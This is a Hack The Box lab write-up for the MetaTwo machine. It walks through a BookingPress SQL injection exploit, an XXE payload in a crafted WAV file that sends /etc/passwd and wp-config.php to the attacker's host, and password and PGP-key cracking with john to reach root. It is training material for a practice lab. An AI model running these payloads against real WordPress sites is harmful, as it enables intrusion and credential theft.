---
layout: post
title: "HTB: MetaTwo"
author: Andrew Cherney
date: 2023-04-29 17:34:59
tags: htb easy-box
icon: "assets/icons/metatwo.png"
post_description: "Wordpress in little surprise to anyone gives us both an initial foothold account and the credentials for a user account. The former through a vulnerable scheduling plugin, and the latter through an image upload bypass to read a config file. The root password is obtained through brute forcing a pgp key to access a passpie password."
---

<h1>Summary</h1>

{{ page.post_description }}

<h1>Enumeration</h1>

```bash
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/MetaTwo]
└──╼ $nmap -sC 10.10.11.186
Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-25 17:47 CST
Nmap scan report for 10.10.11.186
Host is up (0.051s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
| ssh-hostkey: 
|   3072 c4:b4:46:17:d2:10:2d:8f:ec:1d:c9:27:fe:cd:79:ee (RSA)
|   256 2a:ea:2f:cb:23:e8:c5:29:40:9c:ab:86:6d:cd:44:11 (ECDSA)
|_  256 fd:78:c0:b0:e2:20:16:fa:05:0d:eb:d8:3f:12:a4:ab (ED25519)
80/tcp open  http
|_http-title: Did not follow redirect to http://metapress.htb/
```

<h2>Port 80 - http</h2>

{% include img_link src="/img/metatwo/front_page" alt="front_page" ext="png" trunc=600 %}

This site is a bare bones wordpress site with an event signup page for the start up meeting. The requests carries the follow information:

```
action=bookingpress_before_book_appointment&appointment_data%5Bselected_category%5D=1&appointment_data%5Bselected_cat_name%5D=&appointment_data%5Bselected_service%5D=1&appointment_data%5Bselected_service_name%5D=Startup%20meeting&appointment_data%5Bselected_service_price%5D=%240.00&appointment_data%5Bservice_price_without_currency%5D=0&appointment_data%5Bselected_date%5D=2023-02-27&appointment_data%5Bselected_start_time%5D=09%3A30&appointment_data%5Bselected_end_time%5D=10%3A00&appointment_data%5Bcustomer_name%5D=&appointment_data%5Bcustomer_firstname%5D=first&appointment_data%5Bcustomer_lastname%5D=last&appointment_data%5Bcustomer_phone%5D=1111111111&appointment_data%5Bcustomer_email%5D=raccoon%40raccoon.xyz&appointment_data%5Bappointment_note%5D=&appointment_data%5Bselected_payment_method%5D=&appointment_data%5Bcustomer_phone_country%5D=AL&appointment_data%5Btotal_services%5D=&appointment_data%5Bstime%5D=1677384945&appointment_data%5Bspam_captcha%5D=WqO0djgQ1ync&_wpnonce=070a17f10c
```

<h2>BookingPress Exploit</h2>

I threw some html tags and attempted to alert some message but the end result is sanitized and won't let anything through. I then turn to the plugin running this appointment booker, named BookingPress. There exists an unauthenticated SQLi vulnerability for under a certain version. [This cve exploit script](https://github.com/destr4ct/CVE-2022-0739/blob/main/booking-press-expl.py) uses a failure to sanitize POST data before using it for sql queries. 

```bash
┌─[✗]─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/MetaTwo]
└──╼ $python3 cve-2022-0739.py -u http://metapress.htb -n 070a17f10c
- BookingPress PoC
-- Got db fingerprint:  10.5.15-MariaDB-0+deb11u1
-- Count of users:  2
|admin|admin@metapress.htb|$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.|
|manager|manager@metapress.htb|$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70|
```

```bash
┌─[✗]─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/MetaTwo]
└──╼ $john hash2 --wordlist=/opt/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (phpass [phpass ($P$ or $H$) 128/128 SSE2 4x3])
Cost 1 (iteration count) is 8192 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
partylikearockstar (?)
```

<h1>User as jnelson</h1>

<h2>Bypassing Uploads</h2>

Well now I can login to wordpress. But there is one major problem. Any file extension I attempt to upload fails to upload. I search around and I come across [a tryhackme room for CVE-2021-29447](https://tryhackme.com/room/wordpresscve202129447). This cve allows the hacker to smuggle a malicious .wav file into wordpress which uses XXE to retrieve a dtd file with more external xml entities to encode files as base64 and send them to a remote server.  

Creating the wav file:

```bash
echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '"'"'http://10.10.14.14:8000/payload.dtd'"'"'>%remote;%init;%trick;]>\x00' > poc.wav
```

Creating the dtd file:

```
<!ENTITY % file SYSTEM "php://filter/zlib.deflate/read=convert.base64-encode/resource=/etc/passwd">
<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://10.10.14.14:8000/?p=%file;'>" >
```

Result:

```
10.10.11.186 - - [25/Feb/2023 20:28:06] "GET /payload.dtd HTTP/1.1" 200 -
10.10.11.186 - - [25/Feb/2023 20:28:06] "GET /?p=jVRNj5swEL3nV3BspUSGkGSDj22lXjaVuum9MuAFusamNiShv74zY8gmgu5WHtB8vHkezxisMS2/8BCWRZX5d1pplgpXLnIha6MBEcEaDNY5yxxAXjWmjTJFpRfovfA1LIrPg1zvABTDQo3l8jQL0hmgNny33cYbTiYbSRmai0LUEpm2fBdybxDPjXpHWQssbsejNUeVnYRlmchKycic4FUD8AdYoBDYNcYoppp8lrxSAN/DIpUSvDbBannGuhNYpN6Qe3uS0XUZFhOFKGTc5Hh7ktNYc+kxKUbx1j8mcj6fV7loBY4lRrk6aBuw5mYtspcOq4LxgAwmJXh97iCqcnjh4j3KAdpT6SJ4BGdwEFoU0noCgk2zK4t3Ik5QQIc52E4zr03AhRYttnkToXxFK/jUFasn2Rjb4r7H3rWyDj6IvK70x3HnlPnMmbmZ1OTYUn8n/XtwAkjLC5Qt9VzlP0XT0gDDIe29BEe15Sst27OxL5QLH2G45kMk+OYjQ+NqoFkul74jA+QNWiudUSdJtGt44ivtk4/Y/yCDz8zB1mnniAfuWZi8fzBX5gTfXDtBu6B7iv6lpXL+DxSGoX8NPiqwNLVkI+j1vzUes62gRv8nSZKEnvGcPyAEN0BnpTW6+iPaChneaFlmrMy7uiGuPT0j12cIBV8ghvd3rlG9+63oDFseRRE/9Mfvj8FR2rHPdy3DzGehnMRP+LltfLt2d+0aI9O9wE34hyve2RND7xT7Fw== HTTP/1.1" 200
```

Toss that into cyberchef and after base64 decode and raw inflate we receive:

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
sshd:x:104:65534::/run/sshd:/usr/sbin/nologin
jnelson:x:1000:1000:jnelson,,,:/home/jnelson:/bin/bash
systemd-timesync:x:999:999:systemd Time Synchronization:/:/usr/sbin/nologin
systemd-coredump:x:998:998:systemd Core Dumper:/:/usr/sbin/nologin
mysql:x:105:111:MySQL Server,,,:/nonexistent:/bin/false
proftpd:x:106:65534::/run/proftpd:/usr/sbin/nologin
ftp:x:107:65534::/srv/ftp:/usr/sbin/nologin
```

I can now change the **/etc/passwd** to **../wp-config.php** and find some credentials for the database and perhaps user. 

<h2>FTP</h2>

Important part received back from exploit:

```
define( 'FS_METHOD', 'ftpext' );
define( 'FTP_USER', 'metapress.htb' );
define( 'FTP_PASS', '9NYS_ii@FyL_p5M2NvJ' );
define( 'FTP_HOST', 'ftp.metapress.htb' );
define( 'FTP_BASE', 'blog/' );
define( 'FTP_SSL', false );
```

FTP eh? Well time to see what files I can find.

```bash
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/MetaTwo]
└──╼ $ftp metapress.htb
Connected to metapress.htb.
220 ProFTPD Server (Debian) [::ffff:10.10.11.186]
Name (metapress.htb:raccoon): metapress.htb
331 Password required for metapress.htb
Password:
230 User metapress.htb logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>ls
200 PORT command successful
150 Opening ASCII mode data connection for file list
drwxr-xr-x   5 metapress.htb metapress.htb     4096 Oct  5 14:12 blog
drwxr-xr-x   3 metapress.htb metapress.htb     4096 Oct  5 14:12 mailer
226 Transfer complete
ftp> cd mailer
250 CWD command successful
ftp> ls
200 PORT command successful
150 Opening ASCII mode data connection for file list
drwxr-xr-x   4 metapress.htb metapress.htb     4096 Oct  5 14:12 PHPMailer
-rw-r--r--   1 metapress.htb metapress.htb     1126 Jun 22  2022 send_email.php
226 Transfer complete
ftp> get send_email.php
local: send_email.php remote: send_email.php
200 PORT command successful
150 Opening BINARY mode data connection for send_email.php (1126 bytes)
226 Transfer complete
1126 bytes received in 0.34 secs (3.2279 kB/s)
```

In plain english we find jnelson's password to login with. What a fun journey around this box so far. 

```
$mail->Host = "mail.metapress.htb";
$mail->SMTPAuth = true;                          
$mail->Username = "jnelson@metapress.htb";                 
$mail->Password = "Cb4_JmWM8zUZWMu@Ys";                           
$mail->SMTPSecure = "tls";                           
$mail->Port = 587;
```

```bash
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/MetaTwo]
└──╼ $ssh jnelson@metapress.htb
jnelson@metapress.htb's password: 
.....
jnelson@meta2:~$ cat user.txt
a87ab5030bfe5-------------------
```

<h1>Root</h1>

<h2>PGP Decryption</h2>

In looking around I see a .passpie directory, and looking further it has pgp keys and an encrypted root password. 

```bash
jnelson@meta2:~$ ls -al
total 844
drwxr-xr-x 5 jnelson jnelson   4096 Feb 26 02:55 .
drwxr-xr-x 3 root    root      4096 Oct  5 15:12 ..
lrwxrwxrwx 1 root    root         9 Jun 26  2022 .bash_history -> /dev/null
-rw-r--r-- 1 jnelson jnelson    220 Jun 26  2022 .bash_logout
-rw-r--r-- 1 jnelson jnelson   3526 Jun 26  2022 .bashrc
drwx------ 3 jnelson jnelson   4096 Feb 26 02:55 .gnupg
-rw-r--r-- 1 jnelson jnelson 826127 Feb 26 02:54 linpeas.sh
drwxr-xr-x 3 jnelson jnelson   4096 Oct 25 12:51 .local
dr-xr-x--- 3 jnelson jnelson   4096 Oct 25 12:52 .passpie
-rw-r--r-- 1 jnelson jnelson    807 Jun 26  2022 .profile
-rw-r----- 1 root    jnelson     33 Feb 26 00:10 user.txt
jnelson@meta2:~$ cd .passpie
jnelson@meta2:~/.passpie$ ls -al
total 24
dr-xr-x--- 3 jnelson jnelson 4096 Oct 25 12:52 .
drwxr-xr-x 5 jnelson jnelson 4096 Feb 26 02:55 ..
-r-xr-x--- 1 jnelson jnelson    3 Jun 26  2022 .config
-r-xr-x--- 1 jnelson jnelson 5243 Jun 26  2022 .keys
dr-xr-x--- 2 jnelson jnelson 4096 Oct 25 12:52 ssh
jnelson@meta2:~/.passpie$ head .keys 
-----BEGIN PGP PUBLIC KEY BLOCK-----

mQSuBGK4V9YRDADENdPyGOxVM7hcLSHfXg+21dENGedjYV1gf9cZabjq6v440NA1
AiJBBC1QUbIHmaBrxngkbu/DD0gzCEWEr2pFusr/Y3yY4codzmteOW6Rg2URmxMD
/GYn9FIjUAWqnfdnttBbvBjseL4sECpmgxTIjKbWAXlqgEgNjXD306IweEy2FOho
3LpAXxfk8C/qUCKcpxaz0G2k0do4+VTKZ+5UDpqM5++soJqhCrUYudb9zyVyXTpT
ZjMvyXe5NeC7JhBCKh+/Wqc4xyBcwhDdW+WU54vuFUthn+PUubEN1m+s13BkyvHV
gNAM4v6terRItXdKvgvHtJxE0vhlNSjFAedACHC4sN+dRqFu4li8XPIVYGkuK9pX
5xA6Nj+8UYRoZrP4SYtaDslT63ZaLd2MvwP+xMw2XEv8Uj3TGq6BIVWmajbsqkEp
tQkU7d+nPt1aw2sA265vrIzry02NAhxL9YQGNJmXFbZ0p8cT3CswedP8XONmVdxb
jnelson@meta2:~/.passpie$ tail .keys 
+PyrTxF+odQ6aSEhT4JZrCk5Ef7/7aGMH4UcXuiWrgTPFiDovicAAwUD/i6Q+sq+
FZplPakkaWO7hBC8NdCWsBKIQcPqZoyoEY7m0mpuSn4Mm0wX1SgNrncUFEUR6pyV
jqRBTGfPPjwLlaw5zfV+r7q+P/jTD09usYYFglqJj/Oi47UVT13ThYKyxKL0nn8G
JiJHAWqExFeq8eD22pTIoueyrybCfRJxzlJV/gcDAsPttfCSRgia/1PrBxACO3+4
VxHfI4p2KFuza9hwok3jrRS7D9CM51fK/XJkMehVoVyvetNXwXUotoEYeqoDZVEB
J2h0nXerWPkNKRrrfYh4BBgRCAAgFiEEfGeGp1YbyE9QSGceOHd1w1dF0gMFAmK4
V9YCGwwACgkQOHd1w1dF0gOm5gD9GUQfB+Jx/Fb7TARELr4XFObYZq7mq/NUEC+P
o3KGdNgA/04lhPjdN3wrzjU3qmrLfo6KI+w2uXLaw+bIT1XZurDN
=7Uo6
-----END PGP PRIVATE KEY BLOCK-----
jnelson@meta2:~/.passpie$ cat ssh/
jnelson.pass  root.pass     
jnelson@meta2:~/.passpie$ cat ssh/root.pass 
comment: ''
fullname: root@ssh
login: root
modified: 2022-06-26 08:58:15.621572
name: ssh
password: '-----BEGIN PGP MESSAGE-----
  hQEOA6I+wl+LXYMaEAP/T8AlYP9z05SEST+Wjz7+IB92uDPM1RktAsVoBtd3jhr2
  nAfK00HJ/hMzSrm4hDd8JyoLZsEGYphvuKBfLUFSxFY2rjW0R3ggZoaI1lwiy/Km
  yG2DF3W+jy8qdzqhIK/15zX5RUOA5MGmRjuxdco/0xWvmfzwRq9HgDxOJ7q1J2ED
  /2GI+i+Gl+Hp4LKHLv5mMmH5TZyKbgbOL6TtKfwyxRcZk8K2xl96c3ZGknZ4a0Gf
  iMuXooTuFeyHd9aRnNHRV9AQB2Vlg8agp3tbUV+8y7szGHkEqFghOU18TeEDfdRg
  krndoGVhaMNm1OFek5i1bSsET/L4p4yqIwNODldTh7iB0ksB/8PHPURMNuGqmeKw
  mboS7xLImNIVyRLwV80T0HQ+LegRXn1jNnx6XIjOZRo08kiqzV2NaGGlpOlNr3Sr
  lpF0RatbxQGWBks5F3o=
  =uh1B
  -----END PGP MESSAGE-----

```

I try to decrypt the message but it's password protected, meaning our good friend john can crack the hash after using gpg2john. 

```bash
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/MetaTwo]
└──╼ $gpg2john pgpkey > pgphash
┌─[✗]─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/MetaTwo]
└──╼ $john -w:/opt/wordlists/rockyou.txt pgphash
Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
Cost 1 (s2k-count) is 65011712 for all loaded hashes
Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 7 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
blink182         (Passpie)
1g 0:00:00:02 DONE (2023-02-25 21:03) 0.3448g/s 56.55p/s 56.55c/s 56.55C/s ginger..blink182
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Now I can import the private key with the password and decrypt the password.

```bash
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/MetaTwo]
└──╼ $gpg --import pgpkey 
gpg: key 387775C35745D203: public key "Passpie (Auto-generated by Passpie) <passpie@local>" imported
gpg: key 387775C35745D203: secret key imported
gpg: Total number processed: 1
gpg:               imported: 1
gpg:       secret keys read: 1
gpg:   secret keys imported: 1
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/MetaTwo]
└──╼ $gpg --decrypt rootpass.txt 
gpg: invalid armor header:   hQEOA6I+wl+LXYMaEAP/T8AlYP9z05SEST+Wjz7+IB92uDPM1RktAsVoBtd3jhr2\n
gpg: encrypted with 1024-bit ELG key, ID A23EC25F8B5D831A, created 2022-06-26
      "Passpie (Auto-generated by Passpie) <passpie@local>"
p7qfAZt4_A1xo_0x
```

```bash
jnelson@meta2:~/.passpie$ su root
Password: 
root@meta2:/home/jnelson/.passpie# cat /root/root.txt
9faae75de12ad0b---------------
```
